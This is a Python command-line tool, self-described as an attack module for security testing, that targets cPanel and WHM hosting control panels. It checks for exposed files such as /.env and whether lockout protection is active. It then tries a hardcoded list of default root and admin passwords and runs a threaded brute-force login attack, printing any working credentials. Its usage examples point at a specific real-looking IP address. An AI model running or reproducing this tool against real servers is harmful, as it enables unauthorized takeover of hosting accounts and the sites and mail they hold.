#!/usr/bin/env python3
"""
Advanced WHM/cPanel Attack Module v1.0
Comprehensive WHM and cPanel exploitation toolkit for security testing
"""

import argparse
import sys
import requests
from typing import List, Dict, Tuple, Optional
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor, as_completed
import json
from datetime import datetime
import urllib3
from urllib.parse import urljoin, urlparse
import re

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


@dataclass
class CPanelTarget:
    """cPanel/WHM target information"""
    url: str
    timeout: int = 10
    verify_ssl: bool = False


@dataclass
class CPanelCredential:
    """cPanel/WHM credential pair"""
    username: str
    password: str


@dataclass
class CPanelVulnerability:
    """cPanel/WHM vulnerability finding"""
    severity: str
    type: str
    details: str
    credential: Optional[CPanelCredential] = None
    data: Optional[Dict] = None


class CPanelAttacker:
    """Advanced cPanel/WHM attack toolkit"""
    
    # Common cPanel/WHM ports
    CPANEL_PORTS = {
        2082: 'cPanel HTTP',
        2083: 'cPanel HTTPS',
        2086: 'WHM HTTP',
        2087: 'WHM HTTPS',
        2095: 'Webmail HTTP',
        2096: 'Webmail HTTPS',
    }
    
    # Common default credentials
    DEFAULT_CREDENTIALS = [
        ('root', 'root'),
        ('root', 'password'),
        ('root', 'cpanel'),
        ('root', 'admin'),
        ('root', '123456'),
        ('root', 'changeme'),
        ('admin', 'admin'),
        ('admin', 'password'),
        ('admin', 'cpanel'),
    ]
    
    # Login endpoints
    LOGIN_ENDPOINTS = {
        'whm': [
            '/login/',
            '/scripts/login',
            '/login.cgi',
        ],
        'cpanel': [
            '/login/',
            '/frontend/jupiter/login.html',
            '/frontend/paper_lantern/login.html',
        ],
        'webmail': [
            '/login/',
            '/',
        ]
    }
    
    def __init__(self, target: CPanelTarget, verbose: bool = False):
        self.target = target
        self.verbose = verbose
        self.vulnerabilities: List[CPanelVulnerability] = []
        self.session = requests.Session()
        self.session.verify = target.verify_ssl
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
        
    def log(self, message: str, level: str = "INFO"):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        prefix = {
            "INFO": "[*]",
            "SUCCESS": "[+]",
            "ERROR": "[!]",
            "WARNING": "[!]",
            "DEBUG": "[~]"
        }.get(level, "[*]")
        
        color = {
            "SUCCESS": "\033[92m",
            "ERROR": "\033[91m",
            "WARNING": "\033[93m",
            "INFO": "\033[94m",
            "DEBUG": "\033[90m"
        }.get(level, "")
        
        reset = "\033[0m" if color else ""
        print(f"{color}{prefix} [{timestamp}] {message}{reset}")
        
    def detect_panel_type(self) -> Optional[str]:
        """Detect if target is WHM, cPanel, or Webmail"""
        self.log("Detecting panel type...")
        
        try:
            response = self.session.get(self.target.url, timeout=self.target.timeout)
            content = response.text.lower()
            
            if 'whm' in content or 'web host manager' in content:
                self.log("Detected: WHM (Web Host Manager)", "SUCCESS")
                return 'whm'
            elif 'cpanel' in content:
                self.log("Detected: cPanel", "SUCCESS")
                return 'cpanel'
            elif 'webmail' in content:
                self.log("Detected: Webmail", "SUCCESS")
                return 'webmail'
            else:
                # Check by port
                parsed = urlparse(self.target.url)
                port = parsed.port
                
                if port in [2086, 2087]:
                    self.log("Detected by port: WHM", "SUCCESS")
                    return 'whm'
                elif port in [2082, 2083]:
                    self.log("Detected by port: cPanel", "SUCCESS")
                    return 'cpanel'
                elif port in [2095, 2096]:
                    self.log("Detected by port: Webmail", "SUCCESS")
                    return 'webmail'
            
        except Exception as e:
            if self.verbose:
                self.log(f"Detection error: {e}", "DEBUG")
        
        self.log("Could not detect panel type", "WARNING")
        return None
    
    def check_accessibility(self) -> bool:
        """Check if panel is accessible"""
        try:
            response = self.session.get(
                self.target.url,
                timeout=self.target.timeout,
                allow_redirects=True
            )
            return response.status_code in [200, 302, 301]
        except Exception as e:
            if self.verbose:
                self.log(f"Accessibility check error: {e}", "DEBUG")
            return False
    
    def check_security_headers(self) -> Dict:
        """Check for security headers"""
        self.log("Checking security headers...")
        
        headers_check = {
            'X-Frame-Options': False,
            'X-Content-Type-Options': False,
            'Strict-Transport-Security': False,
            'Content-Security-Policy': False,
            'X-XSS-Protection': False,
        }
        
        try:
            response = self.session.get(self.target.url, timeout=self.target.timeout)
            
            for header in headers_check.keys():
                if header in response.headers:
                    headers_check[header] = True
                    if self.verbose:
                        self.log(f"  ✓ {header}: {response.headers[header]}", "DEBUG")
                else:
                    if self.verbose:
                        self.log(f"  ✗ {header}: Missing", "DEBUG")
            
            missing = [h for h, present in headers_check.items() if not present]
            
            if missing:
                self.log(f"Missing security headers: {', '.join(missing)}", "WARNING")
                vuln = CPanelVulnerability(
                    severity="MEDIUM",
                    type="Missing Security Headers",
                    details=f"Panel missing security headers: {', '.join(missing)}",
                    data={'missing_headers': missing}
                )
                self.vulnerabilities.append(vuln)
            
        except Exception as e:
            if self.verbose:
                self.log(f"Header check error: {e}", "DEBUG")
        
        return headers_check
    
    def check_ssl_configuration(self) -> Dict:
        """Check SSL/TLS configuration"""
        self.log("Checking SSL/TLS configuration...")
        
        ssl_info = {
            'https': False,
            'certificate_valid': False,
            'tls_version': None,
        }
        
        parsed = urlparse(self.target.url)
        
        if parsed.scheme == 'https':
            ssl_info['https'] = True
            
            try:
                # Try with SSL verification
                response = requests.get(
                    self.target.url,
                    timeout=self.target.timeout,
                    verify=True
                )
                ssl_info['certificate_valid'] = True
                self.log("SSL certificate is valid", "SUCCESS")
                
            except requests.exceptions.SSLError:
                ssl_info['certificate_valid'] = False
                self.log("SSL certificate is INVALID or self-signed", "WARNING")
                
                vuln = CPanelVulnerability(
                    severity="MEDIUM",
                    type="Invalid SSL Certificate",
                    details="Panel using invalid or self-signed SSL certificate",
                    data=ssl_info
                )
                self.vulnerabilities.append(vuln)
            except Exception as e:
                if self.verbose:
                    self.log(f"SSL check error: {e}", "DEBUG")
        else:
            self.log("WARNING: Panel using HTTP (unencrypted)", "WARNING")
            
            vuln = CPanelVulnerability(
                severity="HIGH",
                type="Unencrypted HTTP",
                details="Panel accessible over unencrypted HTTP - credentials sent in plaintext",
                data=ssl_info
            )
            self.vulnerabilities.append(vuln)
        
        return ssl_info
    
    def test_whm_login(self, username: str, password: str) -> bool:
        """Test WHM login"""
        login_urls = [
            '/login/',
            '/scripts/login',
        ]
        
        for login_path in login_urls:
            try:
                login_url = urljoin(self.target.url, login_path)
                
                # WHM login POST data
                data = {
                    'user': username,
                    'pass': password,
                }
                
                response = self.session.post(
                    login_url,
                    data=data,
                    timeout=self.target.timeout,
                    allow_redirects=False
                )
                
                # Check for successful login indicators
                if response.status_code in [302, 301]:
                    # Check redirect location
                    location = response.headers.get('Location', '')
                    if 'logout' in location.lower() or 'home' in location.lower():
                        return True
                
                # Check response content
                if 'logout' in response.text.lower() or 'whm home' in response.text.lower():
                    return True
                
                # Check for error messages
                if 'incorrect' in response.text.lower() or 'invalid' in response.text.lower():
                    return False
                    
            except Exception as e:
                if self.verbose:
                    self.log(f"WHM login test error: {e}", "DEBUG")
                continue
        
        return False
    
    def test_cpanel_login(self, username: str, password: str) -> bool:
        """Test cPanel login"""
        login_urls = [
            '/login/',
            '/login.cgi',
        ]
        
        for login_path in login_urls:
            try:
                login_url = urljoin(self.target.url, login_path)
                
                # cPanel login POST data
                data = {
                    'user': username,
                    'pass': password,
                }
                
                response = self.session.post(
                    login_url,
                    data=data,
                    timeout=self.target.timeout,
                    allow_redirects=False
                )
                
                # Check for successful login
                if response.status_code in [302, 301]:
                    location = response.headers.get('Location', '')
                    if 'logout' in location.lower() or 'home' in location.lower() or 'frontend' in location.lower():
                        return True
                
                if 'logout' in response.text.lower() or 'cpanel home' in response.text.lower():
                    return True
                
                if 'incorrect' in response.text.lower() or 'invalid' in response.text.lower():
                    return False
                    
            except Exception as e:
                if self.verbose:
                    self.log(f"cPanel login test error: {e}", "DEBUG")
                continue
        
        return False
    
    def test_login(self, username: str, password: str, panel_type: str = None) -> bool:
        """Test login for detected panel type"""
        if panel_type == 'whm':
            return self.test_whm_login(username, password)
        elif panel_type == 'cpanel':
            return self.test_cpanel_login(username, password)
        else:
            # Try both
            if self.test_whm_login(username, password):
                return True
            if self.test_cpanel_login(username, password):
                return True
        
        return False
    
    def brute_force_single(self, username: str, password: str, panel_type: str) -> Optional[CPanelCredential]:
        """Test a single credential pair"""
        if self.test_login(username, password, panel_type):
            return CPanelCredential(username, password)
        return None
    
    def brute_force_attack(self, usernames: List[str], passwords: List[str],
                          panel_type: str = None, threads: int = 3) -> List[CPanelCredential]:
        """Brute force cPanel/WHM authentication"""
        self.log(f"Starting brute force attack with {len(usernames)} users and {len(passwords)} passwords")
        self.log("⚠️  WARNING: This may lock out accounts or trigger security alerts!", "WARNING")
        
        valid_creds = []
        total = len(usernames) * len(passwords)
        tested = 0
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for username in usernames:
                for password in passwords:
                    future = executor.submit(self.brute_force_single, username, password, panel_type)
                    futures.append(future)
            
            for future in as_completed(futures):
                tested += 1
                if tested % 10 == 0 or tested == total:
                    self.log(f"Progress: {tested}/{total} ({tested*100//total}%)", "DEBUG")
                
                result = future.result()
                if result:
                    self.log(f"VALID CREDENTIALS FOUND: {result.username}:{result.password}", "SUCCESS")
                    valid_creds.append(result)
                    
                    vuln = CPanelVulnerability(
                        severity="CRITICAL",
                        type="Weak Credentials",
                        details=f"Panel accepts weak credentials: {result.username}:{result.password}",
                        credential=result
                    )
                    self.vulnerabilities.append(vuln)
                    
                    # Stop after first valid cred to avoid lockout
                    self.log("Stopping brute force after first success to avoid lockout", "INFO")
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
        
        return valid_creds
    
    def test_default_credentials(self, panel_type: str = None) -> List[CPanelCredential]:
        """Test common default credentials"""
        self.log("Testing default credentials...")
        valid_creds = []
        
        # Add hostname-based passwords
        try:
            parsed = urlparse(self.target.url)
            hostname = parsed.hostname
            
            # Add hostname variations
            additional_passwords = [
                hostname,
                hostname.split('.')[0],  # First part of hostname
            ]
            
            for pwd in additional_passwords:
                if pwd and pwd not in [p for u, p in self.DEFAULT_CREDENTIALS]:
                    self.DEFAULT_CREDENTIALS.append(('root', pwd))
                    
        except:
            pass
        
        for username, password in self.DEFAULT_CREDENTIALS:
            if self.verbose:
                self.log(f"Testing {username}:{password}", "DEBUG")
            
            if self.test_login(username, password, panel_type):
                cred = CPanelCredential(username, password)
                valid_creds.append(cred)
                self.log(f"DEFAULT CREDENTIALS FOUND: {username}:{password}", "SUCCESS")
                
                vuln = CPanelVulnerability(
                    severity="CRITICAL",
                    type="Default Credentials",
                    details=f"Panel using default credentials: {username}:{password}",
                    credential=cred
                )
                self.vulnerabilities.append(vuln)
                
                # Stop after first success
                break
        
        if not valid_creds:
            self.log("No default credentials found", "INFO")
        
        return valid_creds
    
    def check_info_disclosure(self) -> Dict:
        """Check for information disclosure"""
        self.log("Checking for information disclosure...")
        
        info_found = {}
        
        # Check common info disclosure paths
        test_paths = [
            '/.well-known/',
            '/readme.txt',
            '/version',
            '/server-status',
            '/.git/',
            '/.env',
        ]
        
        for path in test_paths:
            try:
                url = urljoin(self.target.url, path)
                response = self.session.get(url, timeout=self.target.timeout)
                
                if response.status_code == 200 and len(response.text) > 0:
                    info_found[path] = {
                        'status': response.status_code,
                        'size': len(response.text),
                        'content_preview': response.text[:200]
                    }
                    self.log(f"Info disclosure found: {path}", "WARNING")
                    
            except Exception:
                continue
        
        if info_found:
            vuln = CPanelVulnerability(
                severity="MEDIUM",
                type="Information Disclosure",
                details=f"Found {len(info_found)} information disclosure paths",
                data={'paths': list(info_found.keys())}
            )
            self.vulnerabilities.append(vuln)
        
        return info_found
    
    def check_brute_force_protection(self) -> bool:
        """Check if brute force protection is enabled"""
        self.log("Checking brute force protection (cPHulk)...")
        
        # Try multiple failed logins
        for i in range(3):
            try:
                login_url = urljoin(self.target.url, '/login/')
                data = {
                    'user': f'testuser{i}',
                    'pass': f'wrongpassword{i}',
                }
                
                response = self.session.post(
                    login_url,
                    data=data,
                    timeout=self.target.timeout
                )
                
                # Check for rate limiting or blocking
                if 'blocked' in response.text.lower() or 'too many' in response.text.lower():
                    self.log("Brute force protection is ENABLED (cPHulk active)", "SUCCESS")
                    return True
                
                if response.status_code == 429:
                    self.log("Rate limiting is enabled", "SUCCESS")
                    return True
                    
            except Exception:
                continue
        
        self.log("No brute force protection detected", "WARNING")
        
        vuln = CPanelVulnerability(
            severity="HIGH",
            type="No Brute Force Protection",
            details="Panel does not appear to have brute force protection enabled",
            data={}
        )
        self.vulnerabilities.append(vuln)
        
        return False
    
    def generate_report(self, output_file: str = None) -> Dict:
        """Generate comprehensive report"""
        report = {
            'target': {
                'url': self.target.url
            },
            'scan_time': datetime.now().isoformat(),
            'vulnerabilities': [],
            'summary': {
                'total_vulnerabilities': len(self.vulnerabilities),
                'critical': 0,
                'high': 0,
                'medium': 0,
                'low': 0
            }
        }
        
        for vuln in self.vulnerabilities:
            vuln_dict = {
                'severity': vuln.severity,
                'type': vuln.type,
                'details': vuln.details
            }
            
            if vuln.credential:
                vuln_dict['credential'] = {
                    'username': vuln.credential.username,
                    'password': vuln.credential.password
                }
            
            if vuln.data:
                vuln_dict['data'] = vuln.data
            
            report['vulnerabilities'].append(vuln_dict)
            
            # Count by severity
            severity = vuln.severity.upper()
            if severity == 'CRITICAL':
                report['summary']['critical'] += 1
            elif severity == 'HIGH':
                report['summary']['high'] += 1
            elif severity == 'MEDIUM':
                report['summary']['medium'] += 1
            else:
                report['summary']['low'] += 1
        
        if output_file:
            with open(output_file, 'w') as f:
                json.dump(report, f, indent=2, default=str)
            self.log(f"Report saved to: {output_file}", "SUCCESS")
        
        return report
    
    def run_comprehensive_attack(self, test_defaults: bool = True,
                                brute_force: bool = False,
                                usernames: List[str] = None,
                                passwords: List[str] = None) -> Dict:
        """Run comprehensive cPanel/WHM attack"""
        
        self.log(f"Starting cPanel/WHM attack against {self.target.url}")
        self.log("="*60)
        
        # Check accessibility
        self.log("Checking if panel is accessible...")
        if not self.check_accessibility():
            self.log("Panel is not accessible", "ERROR")
            return {'error': 'Panel not accessible'}
        
        self.log("Panel is ACCESSIBLE", "SUCCESS")
        
        # Detect panel type
        panel_type = self.detect_panel_type()
        
        # Security checks
        self.check_security_headers()
        self.check_ssl_configuration()
        self.check_info_disclosure()
        self.check_brute_force_protection()
        
        # Test default credentials
        valid_creds = []
        if test_defaults:
            valid_creds = self.test_default_credentials(panel_type)
        
        # Brute force attack (if explicitly requested)
        if brute_force and usernames and passwords:
            self.log("⚠️  Starting brute force - may trigger account lockouts!", "WARNING")
            brute_creds = self.brute_force_attack(usernames, passwords, panel_type)
            valid_creds.extend(brute_creds)
        
        return {
            'panel_type': panel_type,
            'valid_credentials': [(c.username, c.password) for c in valid_creds],
            'vulnerabilities': self.vulnerabilities
        }


def main():
    parser = argparse.ArgumentParser(
        description='Advanced WHM/cPanel Attack Module v1.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Test default credentials and security
  python3 cpanel_attack.py https://64.31.47.162:2087
  
  # Test specific cPanel instance
  python3 cpanel_attack.py https://example.com:2083
  
  # Brute force (⚠️  may cause lockouts)
  python3 cpanel_attack.py https://64.31.47.162:2087 --brute-force -U users.txt -P pass.txt
  
  # Save report
  python3 cpanel_attack.py https://64.31.47.162:2087 -o cpanel_report.json
        """
    )
    
    parser.add_argument('url', help='Target cPanel/WHM URL (e.g., https://host:2087)')
    parser.add_argument('--timeout', type=int, default=10, help='Connection timeout (default: 10)')
    parser.add_argument('--no-defaults', action='store_true', help='Skip default credential test')
    parser.add_argument('--brute-force', action='store_true', help='Enable brute force (⚠️  may lock accounts)')
    parser.add_argument('-U', '--usernames', help='File with usernames (one per line)')
    parser.add_argument('-P', '--passwords', help='File with passwords (one per line)')
    parser.add_argument('--threads', type=int, default=3, help='Threads for brute force (default: 3)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-o', '--output', help='Output JSON report file')
    parser.add_argument('--verify-ssl', action='store_true', help='Verify SSL certificates')
    
    args = parser.parse_args()
    
    # Create target
    target = CPanelTarget(
        url=args.url,
        timeout=args.timeout,
        verify_ssl=args.verify_ssl
    )
    
    # Create attacker
    attacker = CPanelAttacker(target, verbose=args.verbose)
    
    # Load username/password lists if provided
    usernames = []
    passwords = []
    
    if args.brute_force:
        if not args.usernames or not args.passwords:
            print("[!] Brute force requires -U and -P arguments")
            sys.exit(1)
        
        try:
            with open(args.usernames) as f:
                usernames = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[!] Error reading usernames: {e}")
            sys.exit(1)
        
        try:
            with open(args.passwords) as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[!] Error reading passwords: {e}")
            sys.exit(1)
    
    # Run attack
    try:
        results = attacker.run_comprehensive_attack(
            test_defaults=not args.no_defaults,
            brute_force=args.brute_force,
            usernames=usernames,
            passwords=passwords
        )
        
        # Generate report
        print("\n" + "="*60)
        print("SCAN COMPLETE")
        print("="*60)
        
        if 'error' in results:
            print(f"[!] Error: {results['error']}")
        else:
            print(f"[+] Panel type: {results.get('panel_type', 'Unknown')}")
            print(f"[+] Vulnerabilities found: {len(attacker.vulnerabilities)}")
            
            if results.get('valid_credentials'):
                print(f"[+] Valid credentials: {len(results['valid_credentials'])}")
                for user, pwd in results['valid_credentials']:
                    print(f"    - {user}:{pwd}")
            
            if args.output:
                attacker.generate_report(args.output)
        
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
